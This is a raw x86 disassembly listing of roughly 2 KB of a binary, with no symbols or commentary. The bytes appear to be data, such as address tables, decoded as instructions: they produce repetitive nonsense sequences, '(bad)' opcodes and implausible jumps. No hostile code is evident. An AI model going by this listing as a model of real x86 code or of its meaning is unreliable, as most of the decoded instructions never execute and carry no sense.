  4017fd:	ins    DWORD PTR es:[edi],dx
  4017fe:	fidivr WORD PTR ds:0x62d6ae32
  401804:	ins    BYTE PTR es:[edi],dx
  401805:	nop
  401806:	mov    dl,0xe
  401808:	add    BYTE PTR [edi-0x2b],dl
  40180b:	jp     0x40185d
  40180d:	inc    edx
  40180e:	fld    TBYTE PTR [ebp+0x65]
  401811:	inc    ebx
  401812:	mov    edi,0xc2316546
  401817:	push   cs
  401818:	add    BYTE PTR [eax-0x6ffb694e],dl
  40181e:	push   ss
  40181f:	push   edi
  401820:	add    BYTE PTR [eax-0x6ffff2a7],dl
  401826:	pop    ecx
  401827:	or     eax,0xd5b9000
  40182c:	add    BYTE PTR [eax-0x6ffff2a5],dl
  401832:	pop    ebx
  401833:	or     eax,0xd5b9000
  401838:	add    BYTE PTR [eax-0x6ffff2a5],dl
  40183e:	pop    ebx
  40183f:	or     eax,0xd5b9000
  401844:	add    BYTE PTR [eax+0xd5b],dl
  40184a:	add    BYTE PTR [eax],al
  40184c:	add    BYTE PTR [eax],al
  40184e:	nop
  40184f:	pop    ebx
  401850:	or     eax,0xd5b9000
  401855:	add    BYTE PTR [eax-0x6ffff2a5],dl
  40185b:	pop    ebx
  40185c:	or     eax,0xa7b9000
  401861:	add    BYTE PTR [eax-0x6ffff2a5],dl
  401867:	pop    ebx
  401868:	or     eax,0xd5b9000
  40186d:	add    BYTE PTR [eax-0x6ffff2a5],dl
  401873:	pop    ebx
  401874:	or     eax,0xd5b9000
  401879:	add    BYTE PTR [eax-0x6ffff2a5],dl
  40187f:	pop    ebx
  401880:	or     eax,0xd5b9000
  401885:	add    BYTE PTR [eax-0x6ffff2a5],dl
  40188b:	pop    ebx
  40188c:	or     eax,0xd5b9000
  401891:	add    BYTE PTR [eax-0x6ffff2a5],dl
  401897:	pop    ebx
  401898:	or     eax,0xe7b29000
  40189d:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018a3:	mov    dl,0xe7
  4018a5:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018ab:	mov    dl,0xe7
  4018ad:	add    edx,DWORD PTR [eax+0x3e7b2]
  4018b3:	add    BYTE PTR [eax],al
  4018b5:	add    BYTE PTR [eax],al
  4018b7:	nop
  4018b8:	mov    dl,0xe7
  4018ba:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018c0:	mov    dl,0xe7
  4018c2:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018c8:	mov    dl,0xe7
  4018ca:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018d0:	mov    dl,0xe7
  4018d2:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018d8:	mov    dl,0xe7
  4018da:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018e0:	mov    dl,0xe7
  4018e2:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018e8:	mov    dl,0xe7
  4018ea:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018f0:	mov    dl,0xe7
  4018f2:	add    edx,DWORD PTR [eax-0x6ffc184e]
  4018f8:	mov    dl,0xe7
  4018fa:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401900:	mov    dl,0xe7
  401902:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401908:	mov    dl,0xe7
  40190a:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401910:	mov    dl,0xe7
  401912:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401918:	mov    dl,0xe
  40191a:	jmp    0x40191f
  40191f:	add    BYTE PTR [ebx-0x6c16f14e],dl
  401925:	mov    dl,0xe
  401927:	jmp    0xe94ecbbf
  40192c:	xchg   ebx,eax
  40192d:	mov    dl,0xe
  40192f:	jmp    0xe94ecbc7
  401934:	xchg   ebx,eax
  401935:	mov    dl,0xe
  401937:	jmp    0xe94ecbcf
  40193c:	xchg   ebx,eax
  40193d:	mov    dl,0xe
  40193f:	jmp    0xe94ecbd7
  401944:	xchg   ebx,eax
  401945:	mov    dl,0xe
  401947:	jmp    0xe94ecbdf
  40194c:	xchg   ebx,eax
  40194d:	mov    dl,0xe
  40194f:	cmp    DWORD PTR [edi-0x6ce2f14e],ebx
  401955:	mov    bl,0xe
  401957:	mov    cl,0x40
  401959:	sub    bl,BYTE PTR [esi-0x17]
  40195c:	xchg   ebx,eax
  40195d:	mov    dl,0xe
  40195f:	jmp    0xc94ecbf7
  401964:	mov    WORD PTR [edi+ecx*1+0xebb92f2],?
  40196b:	jmp    0xe94ec849
  401970:	mov    ch,0xb2
  401972:	push   cs
  401973:	jmp    0xcb4ecc0b
  401978:	div    BYTE PTR [esi+ecx*1+0xeb2a3e9]
  40197f:	jmp    0xe94ec7f7
  401984:	add    BYTE PTR [eax],al
  401986:	add    BYTE PTR [eax],al
  401988:	add    BYTE PTR [ebx-0x7c16f10e],dl
  40198e:	mov    dl,0xe
  401990:	jmp    0xec4ecc22
  401995:	xchg   ebx,eax
  401996:	mov    cl,0xe
  401998:	call   0x4ecc30
  40199d:	mov    esp,0xb9000fb3
  4019a2:	mov    bl,0xe
  4019a4:	add    BYTE PTR [ecx-0x56fff59d],ch
  4019aa:	inc    edi
  4019ab:	icebp  
  4019ac:	(bad)  
  4019ad:	mov    ecx,0xbb000eb3
  4019b2:	mov    bl,0xe
  4019b4:	sub    DWORD PTR [ecx-0x56ffe14d],0x79000ea3
  4019be:	mov    bl,0x1e
  4019c0:	add    BYTE PTR [ecx-0x5d],bh
  4019c3:	push   cs
  4019c4:	add    BYTE PTR [ecx-0x4d],ch
  4019c7:	push   cs
  4019c8:	add    BYTE PTR [ecx-0x4d],bl
  4019cb:	push   cs
  4019cc:	add    BYTE PTR [ecx-0x4d],bh
  4019cf:	push   cs
  4019d0:	add    BYTE PTR [ecx-0x4d],bh
  4019d3:	push   cs
  4019d4:	add    BYTE PTR [ebp-0x2efff57a],ch
  4019da:	mov    bl,0xe
  4019dc:	add    BYTE PTR [ecx],bh
  4019de:	mov    bl,0xe
  4019e0:	add    BYTE PTR [ecx],bh
  4019e2:	mov    bl,0xe
  4019e4:	add    BYTE PTR [ecx],ch
  4019e6:	mov    bl,0xe
  4019e8:	add    BYTE PTR [ecx],ch
  4019ea:	mov    bl,0xe
  4019ec:	add    BYTE PTR [eax],al
  4019ee:	add    BYTE PTR [eax],al
  4019f0:	add    BYTE PTR [eax],al
  4019f2:	cmp    DWORD PTR [ebx-0x4cc6fff2],esi
  4019f8:	push   cs
  4019f9:	add    BYTE PTR [ecx],ch
  4019fb:	and    ecx,DWORD PTR [edx]
  4019fd:	add    BYTE PTR [ebp-0x6fff16f],bh
  401a03:	mov    dl,0xe
  401a05:	add    cl,bh
  401a07:	mov    dl,0xe
  401a09:	add    cl,ch
  401a0b:	mov    dl,0xe
  401a0d:	add    cl,ch
  401a0f:	mov    dl,0xe
  401a11:	add    cl,bh
  401a13:	mov    dl,0xe
  401a15:	add    cl,bh
  401a17:	mov    dl,0xe
  401a19:	add    BYTE PTR [eax-0x6ffff2a7],dl
  401a1f:	pop    ecx
  401a20:	or     eax,0xae919000
  401a25:	add    BYTE PTR [eax-0x6ffff2e7],dl
  401a2b:	pop    ecx
  401a2c:	or     eax,0xd599000
  401a31:	add    BYTE PTR [eax-0x6fffe2a7],dl
  401a37:	xchg   ebp,eax
  401a38:	lldt   WORD PTR [eax-0x6ffff2a7]
  401a3f:	pop    ecx
  401a40:	or     eax,0xd5b9000
  401a45:	add    BYTE PTR [eax-0x6ffff2a5],dl
  401a4b:	pop    ebx
  401a4c:	or     eax,0xd5b9000
  401a51:	add    BYTE PTR [eax+0x657e9d],dl
  401a57:	add    BYTE PTR [eax],al
  401a59:	add    BYTE PTR [eax],al
  401a5b:	call   0x9040253f
  401a60:	mov    eax,DWORD PTR [edi+0x4]
  401a63:	nop
  401a64:	pop    ebx
  401a65:	sbb    eax,0x4b5b9000
  401a6a:	add    al,0x90
  401a6c:	pop    ebx
  401a6d:	icebp  
  401a6e:	(bad)  
  401a6f:	aas    
  401a70:	pop    esp
  401a71:	or     eax,0xd5b9000
  401a76:	add    BYTE PTR [eax-0x6ffff2a5],dl
  401a7c:	jnp    0x401a8b
  401a7e:	add    BYTE PTR [eax-0x639eae93],dh
  401a84:	mov    edx,0xb90000a
  401a89:	adc    DWORD PTR [eax],eax
  401a8b:	nop
  401a8c:	pop    ebx
  401a8d:	ins    DWORD PTR es:[edi],dx
  401a8e:	add    al,0x90
  401a90:	pop    ebx
  401a91:	add    eax,0x5f5b9000
  401a96:	add    al,0x90
  401a98:	mov    dl,0xe7
  401a9a:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401aa0:	mov    dl,0xe7
  401aa2:	add    edx,DWORD PTR [eax-0x6ffc584e]
  401aa8:	jb     0x401ac3
  401aaa:	jb     0x401ad9
  401aac:	(bad)  
  401aad:	shl    BYTE PTR [edx-0x70],0xb2
  401ab1:	daa    
  401ab2:	cmp    dl,BYTE PTR [eax-0x6b6c184e]
  401ab8:	mov    dl,0xe7
  401aba:	aaa    
  401abb:	nop
  401abc:	mov    dl,0xe7
  401abe:	pop    ecx
  401abf:	add    BYTE PTR [eax],al
  401ac1:	add    BYTE PTR [eax],al
  401ac3:	add    BYTE PTR [edx+esi*4-0x4d6ffc19],dl
  401aca:	out    0x3,eax
  401acc:	nop
  401acd:	mov    dl,0xe7
  401acf:	add    edx,DWORD PTR [eax-0x6ffc584e]
  401ad5:	lock out 0x3,eax
  401ad8:	nop
  401ad9:	mov    dl,0xe7
  401adb:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401ae1:	mov    dl,0xe7
  401ae3:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401ae9:	mov    dl,0xe7
  401aeb:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401af1:	mov    dl,0xe7
  401af3:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401af9:	mov    dl,0xe7
  401afb:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401b01:	mov    dl,0xe7
  401b03:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401b09:	mov    dl,0xe7
  401b0b:	add    edx,DWORD PTR [eax-0x6ffc184e]
  401b11:	mov    dl,0xe7
  401b13:	add    edx,DWORD PTR [eax-0x6c16f14e]
  401b19:	mov    dl,0xe
  401b1b:	jmp    0xe94ecdb3
  401b20:	xchg   ebx,eax
  401b21:	mov    dl,0xe
  401b23:	jmp    0xe94ecdbb
  401b28:	add    BYTE PTR [eax],al
  401b2a:	add    BYTE PTR [eax],al
  401b2c:	add    BYTE PTR [ebx-0x6c16f14e],dl
  401b32:	mov    dl,0xe
  401b34:	jmp    0xe94ecdcc
  401b39:	xchg   ebx,eax
  401b3a:	mov    dl,0xe
  401b3c:	jmp    0xe94ecdd4
  401b41:	xchg   ebx,eax
  401b42:	mov    dl,0xe
  401b44:	jmp    0xe94ecddc
  401b49:	xchg   ebx,eax
  401b4a:	mov    dl,0xe
  401b4c:	jmp    0xe94ecde4
  401b51:	xchg   ebx,eax
  401b52:	mov    dl,0xe
  401b54:	jmp    0xe94ecdec
  401b59:	xchg   ebx,eax
  401b5a:	mov    dl,0xe
  401b5c:	jmp    0xe94ecdf4
  401b61:	xchg   ebx,eax
  401b62:	mov    dl,0xe
  401b64:	jmp    0xe94ecdfc
  401b69:	xchg   ebx,eax
  401b6a:	mov    dl,0xe
  401b6c:	jmp    0xe94ece04
  401b71:	xchg   ebx,eax
  401b72:	mov    dl,0xe
  401b74:	jmp    0xe94ece0c
  401b79:	xchg   ebx,eax
  401b7a:	mov    dl,0xe
  401b7c:	jmp    0xe94ece14
  401b81:	xchg   ebx,eax
  401b82:	mov    dl,0xe
  401b84:	jmp    0xe94ece1c
  401b89:	xchg   ebx,eax
  401b8a:	mov    dl,0xe
  401b8c:	jmp    0xe94ece24
  401b91:	add    BYTE PTR [eax],al
  401b93:	add    BYTE PTR [eax],al
  401b95:	add    BYTE PTR [ebx-0x6fff14e],dl
  401b9b:	scas   eax,DWORD PTR es:[edi]
  401b9c:	push   cs
  401b9d:	add    cl,ch
  401b9f:	scas   eax,DWORD PTR es:[edi]
  401ba0:	push   cs
  401ba1:	add    cl,ch
  401ba3:	scas   eax,DWORD PTR es:[edi]
  401ba4:	push   cs
  401ba5:	add    cl,bh
  401ba7:	scas   eax,DWORD PTR es:[edi]
  401ba8:	push   cs
  401ba9:	add    cl,bh
  401bab:	scas   eax,DWORD PTR es:[edi]
  401bac:	push   cs
  401bad:	add    cl,ch
  401baf:	scas   eax,DWORD PTR es:[edi]
  401bb0:	push   cs
  401bb1:	add    cl,ch
  401bb3:	scas   eax,DWORD PTR es:[edi]
  401bb4:	push   cs
  401bb5:	add    BYTE PTR [ecx-0x46fff151],bh
  401bbb:	scas   eax,DWORD PTR es:[edi]
  401bbc:	push   cs
  401bbd:	add    BYTE PTR [ecx-0x56fff151],ch
  401bc3:	scas   eax,DWORD PTR es:[edi]
  401bc4:	push   cs
  401bc5:	add    BYTE PTR [ecx-0x46fff151],bh
  401bcb:	scas   eax,DWORD PTR es:[edi]
  401bcc:	push   cs
  401bcd:	add    BYTE PTR [ecx-0x56fff151],ch
  401bd3:	scas   eax,DWORD PTR es:[edi]
  401bd4:	push   cs
  401bd5:	add    BYTE PTR [ecx-0x51],bh
  401bd8:	push   cs
  401bd9:	add    BYTE PTR [ecx-0x51],bh
  401bdc:	push   cs
  401bdd:	add    BYTE PTR [ecx-0x51],ch
  401be0:	push   cs
  401be1:	add    BYTE PTR [ecx-0x51],ch
  401be4:	push   cs
  401be5:	add    BYTE PTR [ecx-0x51],bh
  401be8:	push   cs
  401be9:	add    BYTE PTR [ecx-0x51],bh
  401bec:	push   cs
  401bed:	add    BYTE PTR [ecx-0x51],ch
  401bf0:	push   cs
  401bf1:	add    BYTE PTR [ecx-0x51],ch
  401bf4:	push   cs
  401bf5:	add    BYTE PTR [ecx],bh
  401bf7:	scas   eax,DWORD PTR es:[edi]
  401bf8:	push   cs
  401bf9:	add    BYTE PTR [eax],al
  401bfb:	add    BYTE PTR [eax],al
  401bfd:	add    BYTE PTR [eax],al
  401bff:	cmp    DWORD PTR [edi-0x50d6fff2],ebp
  401c05:	push   cs
  401c06:	add    BYTE PTR [ecx],ch
  401c08:	scas   eax,DWORD PTR es:[edi]
  401c09:	push   cs
  401c0a:	add    BYTE PTR [ecx],bh
  401c0c:	scas   eax,DWORD PTR es:[edi]
  401c0d:	push   cs
  401c0e:	add    BYTE PTR [ecx],bh
  401c10:	scas   eax,DWORD PTR es:[edi]
  401c11:	push   cs
  401c12:	add    BYTE PTR [ecx],ch
  401c14:	scas   eax,DWORD PTR es:[edi]
  401c15:	push   cs
  401c16:	add    BYTE PTR [eax-0x6ffff2a7],dl
  401c1c:	pop    ecx
  401c1d:	or     eax,0xd599000
  401c22:	add    BYTE PTR [eax-0x6ffff2a7],dl
  401c28:	pop    ecx
  401c29:	or     eax,0xd599000
  401c2e:	add    BYTE PTR [eax-0x6ffff2a7],dl
  401c34:	pop    ecx
  401c35:	or     eax,0xd599000
  401c3a:	add    BYTE PTR [eax-0x6ffff2a7],dl
  401c40:	pop    ecx
  401c41:	or     eax,0xd599000
  401c46:	add    BYTE PTR [eax-0x6ffff2a7],dl
  401c4c:	pop    ecx
  401c4d:	or     eax,0xd599000
  401c52:	add    BYTE PTR [eax-0x6ffff2a7],dl
  401c58:	pop    ss
  401c59:	inc    ecx
  401c5a:	add    al,0x90
  401c5c:	mov    ebx,DWORD PTR [esp+eax*1-0x70]
  401c60:	xchg   ebx,eax
  401c61:	pop    esp
  401c62:	add    al,0x0
  401c64:	add    BYTE PTR [eax],al
  401c66:	add    BYTE PTR [eax],al
  401c68:	nop
  401c69:	mov    cl,0x5c
  401c6b:	add    al,0x90
  401c6d:	dec    ebx
  401c6e:	pop    edi
  401c6f:	add    al,0x90
  401c71:	addr16 pop edi
  401c73:	add    al,0x90
  401c75:	scas   eax,DWORD PTR es:[edi]
  401c76:	pop    eax
  401c77:	add    al,0x90
  401c79:	xchg   ebp,eax
  401c7a:	pop    eax
  401c7b:	add    al,0x90
  401c7d:	test   DWORD PTR [eax+0x4],ebx
  401c80:	nop
  401c81:	jmp    0x29d020de
  401c86:	pop    eax
  401c87:	add    al,0x90
  401c89:	add    eax,0x71900458
  401c8e:	pop    eax
  401c8f:	add    al,0x90
  401c91:	adc    DWORD PTR [eax+0x4],ebx
  401c94:	nop
  401c95:	mov    dl,0xf5
  401c97:	push   esi
  401c98:	xchg   esp,eax
  401c99:	mov    dl,0xcb
  401c9b:	push   esi
  401c9c:	mov    WORD PTR [edx-0x4d6ba92f],?
  401ca2:	and    eax,0x13b28c57
  401ca7:	push   edi
  401ca8:	xchg   esp,eax
  401ca9:	mov    dl,0xb
  401cab:	push   edi
  401cac:	mov    WORD PTR [edx-0x4d6ba907],?
  401cb2:	push   edi
  401cb3:	push   edi
  401cb4:	mov    WORD PTR [edx-0x4d6ba87d],?
  401cba:	fwait
  401cbb:	push   edi
  401cbc:	mov    WORD PTR [edx-0x4d6ba8db],?
  401cc2:	cmp    edx,DWORD PTR [edi-0x74]
  401cc5:	mov    dl,0x5f
  401cc7:	push   edi
  401cc8:	xchg   esp,eax
  401cc9:	mov    dl,0xb5
  401ccb:	push   edi
  401ccc:	add    BYTE PTR [eax],al
  401cce:	add    BYTE PTR [eax],al
  401cd0:	add    BYTE PTR [edx+esi*4-0x4d6ba863],cl
  401cd7:	jae    0x401d2e
  401cd9:	mov    WORD PTR [edx-0x4d6ba823],?
  401cdf:	not    DWORD PTR [edi-0x74]
  401ce2:	mov    dl,0x19
  401ce4:	push   edi
  401ce5:	xchg   esp,eax
  401ce6:	mov    dl,0xe7
  401ce8:	add    edx,DWORD PTR [eax-0x6bb2fa4e]
  401cee:	mov    dl,0xdd
  401cf0:	dec    ebp
  401cf1:	mov    WORD PTR [edx-0x4d6bb255],?
  401cf7:	mov    ecx,DWORD PTR [ebp-0x74]
  401cfa:	mov    dl,0xa7
  401cfc:	dec    esp
  401cfd:	xchg   esp,eax
  401cfe:	mov    dl,0xe3
  401d00:	dec    ebp
  401d01:	mov    WORD PTR [edx-0x4d6bb323],?
  401d07:	lea    ecx,[esp+ecx*4-0x4e]
  401d0b:	out    0x3,eax
  401d0d:	nop
  401d0e:	mov    dl,0x4b
  401d10:	dec    esp
  401d11:	mov    WORD PTR [edx-0x4923cef2],?
  401d17:	push   cs
  401d18:	adc    esp,edx
  401d1a:	mov    dh,0xe
  401d1c:	ja     0x401ce9
  401d1e:	mov    dh,0xe
  401d20:	or     ebx,0xffffffb6
  401d23:	push   cs
  401d24:	and    ebx,DWORD PTR [esi+esi*4+0xe]
  401d28:	sub    DWORD PTR [esi+esi*4+0xe],edx
  401d2c:	mov    ebp,0xd10eb64b
  401d31:	dec    ebx
  401d32:	mov    dh,0xe
  401d34:	rol    DWORD PTR [eax],1
  401d36:	add    BYTE PTR [eax],al
  401d38:	add    BYTE PTR [eax],al
  401d3a:	pop    ebx
  401d3b:	mov    dh,0xe
  401d3d:	loope  0x401d9a
  401d3f:	mov    dh,0xe
  401d41:	pop    ebx
  401d42:	cmp    dh,BYTE PTR [esi-0x49c5bef2]
  401d48:	push   cs
  401d49:	and    DWORD PTR [edx-0x4a],ebp
  401d4c:	push   cs
  401d4d:	gs pop ebx
  401d4f:	mov    dh,0xe
  401d51:	jmp    0x274ecfe9
  401d56:	inc    esi
  401d57:	mov    dh,0xe
  401d59:	jmp    0xef4ecff1
  401d5e:	pop    eax
  401d5f:	mov    dh,0xe
  401d61:	mov    bh,0x48
  401d63:	mov    dh,0xe
  401d65:	ret    
  401d66:	dec    eax
  401d67:	mov    dh,0xe
  401d69:	(bad)  
  401d6a:	fdiv   DWORD PTR [esi-0x492766f2]
  401d70:	push   cs
  401d71:	test   eax,ecx
  401d73:	mov    dh,0xe
  401d75:	outs   dx,DWORD PTR ds:[esi]
  401d76:	enter  0xeb6,0x57
  401d7a:	fdiv   DWORD PTR [esi-0x4927c0f2]
  401d80:	push   cs
  401d81:	test   eax,0xb50eb6d7
  401d86:	iret   
  401d87:	mov    dh,0xe
  401d89:	rcl    edi,0xb6
  401d8c:	push   cs
  401d8d:	ror    edi,cl
  401d8f:	mov    dh,0xe
  401d91:	add    BYTE PTR [ecx-0x16],bl
  401d94:	or     al,BYTE PTR [eax]
  401d96:	mov    ebp,esp
  401d98:	or     al,BYTE PTR [eax]
  401d9a:	sub    ebp,edx
  401d9c:	or     al,BYTE PTR [eax]
  401d9e:	add    BYTE PTR [eax],al
  401da0:	add    BYTE PTR [eax],al
  401da2:	add    BYTE PTR [ecx-0x72fff514],cl
  401da8:	in     al,dx
  401da9:	or     al,BYTE PTR [eax]
  401dab:	jg     0x401d99
  401dad:	or     al,BYTE PTR [eax]
  401daf:	jne    0x401d9d
  401db1:	or     al,BYTE PTR [eax]
  401db3:	sub    esp,0xecb9000a
  401db9:	or     al,BYTE PTR [eax]
  401dbb:	and    eax,0x1b000aed
  401dc0:	in     eax,dx
  401dc1:	or     al,BYTE PTR [eax]
  401dc3:	arpl   sp,bp
  401dc5:	or     al,BYTE PTR [eax]
  401dc7:	jmp    0x401db3
  401dc9:	or     al,BYTE PTR [eax]
  401dcb:	fldl2e 
  401dcd:	or     al,BYTE PTR [eax]
  401dcf:	(bad)  
  401dd0:	jmp    0xa:0xe9ab000a
  401dd7:	jmp    0x194028c6
  401ddc:	jmp    0x401de8
  401dde:	add    cl,dl
  401de0:	jmp    0xa:0xe939000a
  401de7:	adc    ebp,edx
  401de9:	or     al,BYTE PTR [eax]
  401deb:	inc    ecx
  401dec:	jmp    0xe9f11dfb
  401df1:	or     al,BYTE PTR [eax]
  401df3:	mov    ch,0xe9
  401df5:	or     al,BYTE PTR [eax]
  401df7:	jg     0x401de3
  401df9:	or     al,BYTE PTR [eax]
  401dfb:	pop    ecx
  401dfc:	jnp    0x401e08
  401dfe:	add    BYTE PTR [edi+0x7b],al
  401e01:	or     al,BYTE PTR [eax]
  401e03:	sub    DWORD PTR [ebx+0xa],edi
  401e06:	add    BYTE PTR [eax],al
  401e08:	add    BYTE PTR [eax],al
  401e0a:	add    BYTE PTR [eax],al
  401e0c:	lods   eax,DWORD PTR ds:[esi]
  401e0d:	jle    0x401e19
  401e0f:	add    BYTE PTR [ebp-0x6ffff582],dl
  401e15:	cmc    
  401e16:	xor    al,BYTE PTR [eax+edx*4]
  401e19:	jecxz  0x401e4d
  401e1b:	add    al,0x90
  401e1d:	ret    
  401e1e:	xor    eax,0x35df9004
  401e23:	add    al,0x90
  401e25:	xor    esi,DWORD PTR ds:0x35c19004
  401e2b:	add    al,0x90
  401e2d:	add    esi,DWORD PTR ds:0x35299004
  401e33:	add    al,0x90
  401e35:	sbb    esi,DWORD PTR ds:0x344b9004
  401e3b:	add    al,0x90
  401e3d:	pop    ecx
  401e3e:	xor    al,0x4
  401e40:	nop
  401e41:	imul   esi,DWORD PTR [esp+eax*1],0x433fd90
  401e48:	nop
  401e49:	mov    esi,DWORD PTR ds:0x33f99004
  401e4f:	add    al,0x90
  401e51:	push   DWORD PTR [ebx]
  401e53:	add    al,0x90
  401e55:	gs xor al,0x4
  401e58:	nop
  401e59:	fbstp  TBYTE PTR [esp+eax*1]
  401e5c:	nop
  401e5d:	and    eax,0xbd900434
  401e62:	xor    al,0x4
  401e64:	nop
  401e65:	cdq    
  401e66:	xor    al,0x4
  401e68:	nop
  401e69:	jg     0x401e9f
  401e6b:	add    al,0x90
  401e6d:	dec    edi
  401e6e:	xor    eax,DWORD PTR [eax+eax*1]
  401e71:	add    BYTE PTR [eax],al
  401e73:	add    BYTE PTR [eax],al
  401e75:	nop
  401e76:	imul   esi,DWORD PTR [ebx],0x33759004
  401e7c:	add    al,0x90
  401e7e:	ins    DWORD PTR es:[edi],dx
  401e7f:	xor    eax,DWORD PTR [eax+edx*4]
  401e82:	add    eax,0x21900433
  401e87:	xor    eax,DWORD PTR [eax+edx*4]
  401e8a:	(bad)  
  401e8b:	xor    eax,DWORD PTR [eax+edx*4]
  401e8e:	fnstenv [ebx]
  401e90:	add    al,0x90
  401e92:	mov    dl,0x83
  401e94:	cmp    cl,BYTE PTR [edx+esi*4-0x4d6bc567]
  401e9b:	stc    
  401e9c:	push   eax
  401e9d:	mov    WORD PTR [edx-0x4d6baf1b],?
  401ea3:	mov    DWORD PTR [esp+ecx*4-0x4e],eax
  401ea7:	xchg   ebp,eax
  401ea8:	inc    esp
  401ea9:	xchg   esp,eax
  401eaa:	mov    dl,0xc3
  401eac:	inc    esp
  401ead:	mov    WORD PTR [edx-0x4d6bbb41],?
  401eb3:	loope  0x401ef9
  401eb5:	mov    WORD PTR [edx-0x4d6bbb0b],?
  401ebb:	iret   
  401ebc:	inc    esp
  401ebd:	mov    WORD PTR [edx-0x4d6bbb25],?
  401ec3:	and    eax,0x15b28c45
  401ec8:	inc    ebp
  401ec9:	xchg   esp,eax
  401eca:	mov    dl,0x5
  401ecc:	inc    ebp
  401ecd:	mov    WORD PTR [edx-0x4d6bbb0b],?
  401ed3:	jmp    0x75f2ab1c
  401ed8:	inc    ebp
  401ed9:	add    BYTE PTR [eax],al
  401edb:	add    BYTE PTR [eax],al
  401edd:	add    BYTE PTR [edx+esi*4-0x4d73ba7b],dl
  401ee4:	xchg   edi,eax
  401ee5:	inc    ebp
  401ee6:	xchg   esp,eax
  401ee7:	mov    dl,0x21
  401ee9:	inc    ebp
  401eea:	mov    WORD PTR [edx-0x4d6bbabb],?
  401ef0:	dec    ecx
  401ef1:	inc    ebp
  401ef2:	mov    WORD PTR [edx-0x4d6bbac3],?
  401ef8:	loope  0x401f3b
  401efa:	mov    WORD PTR [edx-0x4d6bbe0b],?
  401f00:	stc    
  401f01:	inc    ecx
  401f02:	mov    WORD PTR [edx-0x4d6bbe2b],?
  401f08:	mov    ecx,0x93b28c41
  401f0d:	inc    ecx
  401f0e:	xchg   esp,eax
  401f0f:	mov    dl,0xe
  401f11:	adc    ecx,0xffffffb6
  401f14:	push   cs
  401f15:	adc    eax,eax
  401f17:	mov    dh,0xe
  401f19:	aad    0xc7
  401f1b:	mov    dh,0xe
  401f1d:	arpl   dx,dx
  401f1f:	mov    dh,0xe
  401f21:	arpl   cx,dx
  401f23:	mov    dh,0xe
  401f25:	ins    DWORD PTR es:[edi],dx
  401f26:	shl    DWORD PTR [esi-0x492e82f2],1
  401f2c:	push   cs
  401f2d:	adc    ecx,ebx
  401f2f:	mov    dh,0xe
  401f31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f32:	shl    DWORD PTR [esi-0x492e3af2],1
  401f38:	push   cs
  401f39:	cdq    
  401f3a:	shl    DWORD PTR [esi-0x49ae62f2],1
  401f40:	push   cs
  401f41:	jecxz  0x401f43
  401f43:	add    BYTE PTR [eax],al
  401f45:	add    BYTE PTR [eax],al
  401f47:	push   edx
  401f48:	mov    dh,0xe
  401f4a:	repz push edx
  401f4c:	mov    dh,0xe
  401f4e:	mov    ebp,0x290eb652
  401f53:	push   ebx
  401f54:	mov    dh,0xe
  401f56:	and    eax,0x90eb653
  401f5b:	push   ebx
  401f5c:	mov    dh,0xe
  401f5e:	fst    QWORD PTR [edx-0x4a]
  401f61:	push   cs
  401f62:	gs push edx
  401f64:	mov    dh,0xe
  401f66:	jge    0x401fba
  401f68:	mov    dh,0xe
  401f6a:	mov    edx,DWORD PTR [edx-0x4a]
  401f6d:	push   cs
  401f6e:	jnp    0x401fc2
  401f70:	mov    dh,0xe
  401f72:	xor    edx,DWORD PTR [edx-0x4a]
  401f75:	push   cs
  401f76:	adc    edx,DWORD PTR [edx-0x4a]
  401f79:	push   cs
  401f7a:	cmp    edx,DWORD PTR [edx-0x4a]
  401f7d:	push   cs
  401f7e:	icebp  
  401f7f:	dec    edi
  401f80:	mov    dh,0xe
  401f82:	call   edi
  401f84:	mov    dh,0xe
  401f86:	(bad)  
  401f88:	mov    dh,0xe
  401f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f8b:	xlat   BYTE PTR ds:[ebx]
  401f8c:	mov    dh,0xe
  401f8e:	add    BYTE PTR ds:0xe7000af4,ch
  401f94:	repz or al,BYTE PTR [eax]
  401f97:	div    ebx
  401f99:	or     al,BYTE PTR [eax]
  401f9b:	(bad)  
  401f9c:	repz or al,BYTE PTR [eax]
  401f9f:	std    
  401fa0:	jmp    0xa:0xeafb000a
  401fa7:	pop    es
  401fa8:	jmp    0x401fb4
  401faa:	add    BYTE PTR [eax],al
  401fac:	add    BYTE PTR [eax],al
  401fae:	add    BYTE PTR [eax],al
  401fb0:	push   ebx
  401fb1:	jmp    0x401fbd
  401fb3:	add    BYTE PTR [ebx-0x15],dl
  401fb6:	or     al,BYTE PTR [eax]
  401fb8:	and    esi,ebp
  401fba:	or     al,BYTE PTR [eax]
  401fbc:	cmp    eax,0x29000af5
  401fc1:	mov    al,0xe
  401fc3:	add    BYTE PTR [ebp+0x63000ae9],ah
  401fc9:	jmp    0xe9c71fd8
  401fce:	or     al,BYTE PTR [eax]
  401fd0:	jmp    0x1402e84
  401fd5:	mov    al,0xe
  401fd7:	cmp    bl,0xaf
  401fda:	push   cs
  401fdb:	xor    al,0xaf
  401fde:	push   cs
  401fdf:	xor    bh,0xaf
  401fe2:	push   cs
  401fe3:	sub    cl,0xaf
  401fe6:	push   cs
  401fe7:	add    BYTE PTR [ecx],dl
  401fe9:	in     eax,0xa
  401feb:	add    BYTE PTR [ebx],bh
  401fed:	in     al,0xa
  401fef:	add    bh,bh
  401ff1:	in     eax,0xa
  401ff3:	add    BYTE PTR [ecx-0xfff151],ch
  401ff9:	in     eax,0xa
  401ffb:	add    cl,bh
  401ffd:	in     eax,0xa
